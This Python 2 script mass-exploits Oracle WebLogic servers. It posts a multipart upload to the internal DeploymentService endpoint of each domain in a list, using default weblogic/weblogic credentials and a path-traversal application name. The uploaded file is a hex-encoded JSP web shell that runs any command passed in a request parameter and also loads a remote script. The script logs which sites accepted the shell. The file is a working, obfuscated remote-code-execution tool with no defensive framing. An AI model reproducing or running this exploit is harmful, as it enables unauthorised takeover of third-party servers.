# -*- coding: utf-8 -*-
import sys
import requests

checkList = []
success = []
error = []
notFound = []

# username=sys.argv[2]
# password=sys.argv[3]

username="weblogic"
password="weblogic"
shell="weblogic.jsp"
isTrue = shell
shell_content="3c2540207061676520696d706f72743d226a6176612e7574696c2e2a2c6a6176612e696f2e2a22253e0d0a3c250d0a253e0d0a3c73637269707420747970653d22746578742f6a61766173637269707422207372633d22687474703a2f2f7777772e71712e636f6d2f3430342f7365617263685f6368696c6472656e2e6a732220636861727365743d227574662d38223e3c2f7363726970743e0d0a3c7072653e0d0a3c250d0a537472696e672045203d20726571756573742e676574506172616d6574657228224522290d0a696620284520213d206e756c6c29207b0d0a2020202050726f6365737320703b0d0a20202020696620282053797374656d2e67657450726f706572747928226f732e6e616d6522292e746f4c6f7765724361736528292e696e6465784f66282277696e222920213d202d31297b0d0a202020202020202070203d2052756e74696d652e67657452756e74696d6528292e657865632822436d642e655865202f432022202b2045293b0d0a202020207d0d0a20202020656c73657b0d0a202020202020202070203d2052756e74696d652e67657452756e74696d6528292e657865632845293b0d0a202020207d0d0a2020202044617461496e70757453747265616d20646973203d206e65772044617461496e70757453747265616d28702e676574496e70757453747265616d2829293b0d0a20202020537472696e672064697372203d206469732e726561644c696e6528293b0d0a202020207768696c652028206469737220213d206e756c6c2029207b0d0a20202020202020206f75742e7072696e746c6e2864697372293b0d0a202020202020202064697372203d206469732e726561644c696e6528293b0d0a202020207d0d0a7d0d0a253e0d0a3c2f7072653e0d0a3c2f424f44593e3c2f48544d4c3e".decode("hex")
payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"weblogic.jsp\"; filename=\"%s\"\r\nContent-Type: false\r\n\r\n %s \r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--" % (shell, shell_content)

def _check(domain):
    domain = domain.strip()
    uri = domain + "/bea_wls_deployment_internal/DeploymentService"
    headers = {
        'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
        "username": username,
        "password": password,
        'wl_request_type': "app_upload",
        'wl_upload_application_name': "/../tmp/_WL_internal/bea_wls_internal/9j4dqk/war",
        'wl_upload_delta': "true",
        'archive': "true",
        'serverName': "Weblogic",
        'server_version': "10.3.6.0",
        'cache-control': "no-cache"
    }
    r = requests.post(uri, data=payload, headers=headers)
    if r.status_code == 200:
        if isTrue in r.text:
            print "%s [SUCCESS]" % uri
            success.append(domain)
        else:
            print "%s [NOT FOUND]" % uri
            notFound.append(domain)
    else:
        print "%s [Connect Error, status: %s]" % (uri, str(r.status_code),)
        error.append(domain)

def inFile(path):
    with open(path, "rb") as f:
        for domain in f:
            if len(domain) >= 5:
                checkList.append(domain)
            else:
                print domain
            
if __name__ == "__main__":
    inFile(sys.argv[1])

    #domain = "http://baidu.com"
    #_check(domain)
    
    for i in checkList:
        _check(i,)
    print "Scan %s Site,Success %s, Error Site %s, NotFound Site %s" % (len(checkList), len(success), len(error), len(notFound),)
    

